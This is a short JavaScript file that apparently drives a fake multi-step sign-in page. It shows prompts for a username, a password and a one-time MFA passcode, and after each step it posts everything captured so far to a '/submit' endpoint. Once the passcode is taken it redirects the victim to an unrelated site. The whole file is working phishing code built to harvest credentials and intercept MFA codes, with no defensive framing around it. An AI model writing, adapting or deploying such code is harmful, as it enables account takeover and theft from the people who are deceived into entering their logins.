var currentStep = "";
var username = "";
var password = "";
var mfa = "";

const nextButton = function( e ) {
  e.preventDefault();
  const text = document.querySelector("#inputField")

  if(currentStep === "username"){
    username = text.value;
  }
  else if (currentStep === "password") {
    password = text.value;
  }
  else if (currentStep === "mfa") {
    mfa = text.value;
  }

  const json = {
    username: username,
    password: password,
    mfa: mfa
  }
  body = JSON.stringify(json);

  // add to server
  fetch("/submit", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body
  })
  updateScreen()
  return false;
}

const updateScreen = function() {
  // update screen to parse next arg
  if(currentStep === "username"){
    moveToPassword()
    currentStep = "password"
  }
  else if (currentStep === "password") {
    moveToMFA()
    currentStep = "mfa"
  }
  else if (currentStep === "mfa") {
    window.location.href = "https://agame.com"
  }
}

const moveToPassword = function() {
  document.getElementById("headerField").innerHTML = "Complete sign in...";
  document.getElementById("subheaderField").innerHTML = username;
  document.getElementById("inputField").value = "";
  document.getElementById("inputField").placeholder = "Enter your password";
  document.getElementById("forgotField").innerHTML = "Forgot password?";
}

const moveToMFA = function() {
  if (username === "wpi.mfa.1@gmail.com") {
    document.getElementById("inputField").value = "";
    document.getElementById("inputField").placeholder = "Enter your one-time passcode";
  }
}

window.onload = function() {
  currentStep = "username"
  const button = document.querySelector( '#loginButton' )
  button.onclick = nextButton
}
